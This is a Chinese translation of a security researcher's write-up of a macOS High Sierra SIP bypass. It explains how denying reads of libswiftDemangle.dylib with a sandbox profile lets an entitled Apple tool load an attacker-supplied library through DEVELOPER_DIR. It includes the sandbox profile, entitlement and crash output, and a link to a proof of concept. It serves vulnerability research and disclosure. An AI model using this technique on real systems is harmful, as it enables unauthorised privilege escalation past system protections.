# 通过沙箱取消程序对已存在 DLL 的访问权限进行劫持

阅读量 **169816**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-26 17:10:06

 **x**

##### 译文声明

本文是翻译文章，文章原作者 0xCC，文章来源：medium.com

原文地址：<https://medium.com/0xcc/bypass-macos-rootless-by-sandboxing-5e24cca744be>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01641036e0d192fedb.jpg)

这个bug已经在Mojave Beta中修复了，但在最新的High Sierra
(10.13.5)仍然存在。一个授权的二进制文件试图加载一个由环境变量控制的不安全的外部库，这是一个逻辑错误。为了利用它，我们需要滥用沙箱，有趣的是，有时可以将防范方法转化为利用方法。

CoreSymbolication(/System/Library/PrivateFrameworks/CoreSymbolication.framework)有一些用于符号化(symbolication)的私有api。当启用swift应用程序符号时，它尝试按以下顺序加载外部库：

  * /Library/PrivateFrameworks/Swift/libswiftDemangle.dylib
  * /Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib
  * /usr/lib/libswiftDemangle.dylib
  * ${xcselect_get_developer_dir_path()}/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib

[](https://p1.ssl.qhimg.com/t018a209363336d2519.jpg "加载外部库")

如果存在，函数xcselect_get_developer_dir_path将返回环境变量DEVELOPER_DIR。

[](https://p0.ssl.qhimg.com/t015a086201a1f7f926.png)

实际上，libswiftDemangle.dylib是存在的。

苹果已经内置了com.apple.SamplingTools：

    
    
    /usr/bin/{filtercalltree,heap32,stringdups32,leaks32,heap,atos,vmmap32,sample,malloc_history32,symbols,vmmap,leaks,stringdups,malloc_history}
    

且取得了权限：

    
    
    ➜  ~ jtool --ent `which symbols`
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
     <key>com.apple.private.kernel.get-kext-info</key>
     <true/>
     <key>com.apple.system-task-ports</key>
     <true/>
    </dict>
    </plist>
    

有了这个权限，SamplingTools就可以在即使是没有根权限的情况下使用Task_for_PID附加到SIP受保护的进程。

    
    
    $ vmmap Finder | head -n 8
    Process: Finder [42164]
    Path: /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder
    Load Address: 0x10515f000
    Identifier: com.apple.finder
    Version: 10.13.5 (10.13.5)
    Build Info: Finder_FE-1054005004000000~3
    Code Type: X86–64
    Parent Process: ??? [1]
    

即使有根权限，LLDB也会失败：

    
    
    $ sudo lldb -n Finder
    Password:
    (lldb) process attach --name "Finder"
    error: attach failed: cannot attach to process due to System Integrity Protection
    

因此，这似乎是一种“meta”权限。有了它，你就可以直接注入到其他已获授权的进程，并获得任意的权利。

让我们先启动一个用swift编译的应用程序，然后运行 **symbols [pid] -printDemangling**
，它将调用CoreSymbolication!demangle，具有加载不安全代码的潜在风险。

但有两个问题。首先，由于/System/Library/PrivateFrameworks/Swift/libswiftDemangle.dylib的存在，似乎无法到达最后一个分支。

实际上我们可以用沙箱堵住他们。是的，用安全机制触发一些不安全的东西。

    
    
    (version 1)
    (allow default)
    (deny file-read*
        (literal "/System/Library/PrivateFrameworks/Swift/libswiftDemangle.dylib")
        (literal "/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib")
        (literal "/usr/lib/libswiftDemangle.dylib")
    )
    

然后，用 **symbols [pid] -printDemangling** 生成一个子进程来触发dylib劫持。

现在我们有第二个问题。它崩溃了。

    
    
    System Integrity Protection: enabled
    Crashed Thread:        0  Dispatch queue: com.apple.main-thread
    Exception Type:        EXC_BAD_ACCESS (Code Signature Invalid)
    Exception Codes:       0x0000000000000032, 0x000000010d745000
    Exception Note:        EXC_CORPSE_NOTIFY
    Termination Reason:    Namespace CODESIGNING, Code 0x2
    kernel messages:
    External Modification Warnings:
    Process used task_for_pid().
    VM Regions Near 0x10d745000:
        MALLOC_LARGE           000000010d70a000-000000010d745000 [  236K] rw-/rwx SM=PRV  
    --> mapped file            000000010d745000-000000010d746000 [    4K] r-x/r-x SM=PRV  Object_id=2929ab85
        mapped file            000000010d748000-000000010d762000 [  104K] r--/r-- SM=ALI  Object_id=2af85085
    Application Specific Information:
    dyld: in dlopen()
    /var/folders/4d/1_vz_55x0mn_w1cyjwr9w42c0000gn/T/tmp.0b5SeUjh/Toolchains/XcodeDefault.xctoolchain/usr/lib/libswiftDemangle.dylib
    12 libdyld.dylib 0x00007fff66c9fd86 dlopen + 86
    13 com.apple.CoreSymbolication 0x00007fff52d15332 invocation function for block in call_external_demangle(char const*) + 348
    14 libdispatch.dylib 0x00007fff66c64e08 _dispatch_client_callout + 8
    15 libdispatch.dylib 0x00007fff66c64dbb dispatch_once_f + 41
    16 com.apple.CoreSymbolication 0x00007fff52cb880f demangle + 298
    17 com.apple.CoreSymbolication 0x00007fff52cb85e3 TRawSymbol<Pointer64>::name() + 75
    18 com.apple.CoreSymbolication 0x00007fff52cbd88e CSSymbolGetName + 166
    

最新MacOS中的com.apple.SamplingTools是使用Library验证标志签名的代码，因此禁止加载未签名的dylib。

    
    
    ➜ ~ codesign -dvvv `which symbols`
    Executable=/usr/bin/symbols
    Identifier=com.apple.SamplingTools
    Format=Mach-O thin (x86_64)
    CodeDirectory v=20100 size=1384 flags=0x2000(library-validation) hashes=36+5 location=embedded
    

我有一台El Capitan虚拟机，我查了一下，以前的SamplingTools存在有效代码签名但没有标志。

唯一的问题是，如果目标运行的是相同的uid，内置二进制文件可以在没有root的情况下执行task_for_pid。但是，如果之前没有执行sudo
/usr/sbin/DevToolsSecurity -enable的话，我们的旧MacOS副本将弹出一个请求管理帐户的对话框。

[](https://p5.ssl.qhimg.com/t01cca362f28b964184.png)

所以只要复制到High Sierra就行了。通过滥用task_for_pid注入到磁盘管理中，将拥有/System的写入权限。

<https://github.com/ChiChou/10.13.5-sip-bypass>

不知道苹果是否意识到了这一点，但它已经在Mojave Beta被修复了。终于没有外部库了。

[](https://p4.ssl.qhimg.com/t01e13fccc165a65ae6.png)

审核人：yiwang 编辑：边边

本文翻译自medium.com [原文链接](https://medium.com/0xcc/bypass-macos-rootless-by-sandboxing-5e24cca744be)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **秋真平** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/148432](/post/id/148432)

安全客 - 有思想的安全新媒体

本文转载自: [medium.com](https://medium.com/0xcc/bypass-macos-rootless-by-sandboxing-5e24cca744be)

如若转载,请注明出处： <https://medium.com/0xcc/bypass-macos-rootless-by-sandboxing-5e24cca744be>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [macOS](/tag/macOS)
  * [exploit](/tag/exploit)
  * [技术分析](/tag/技术分析)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg) 秋真平

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

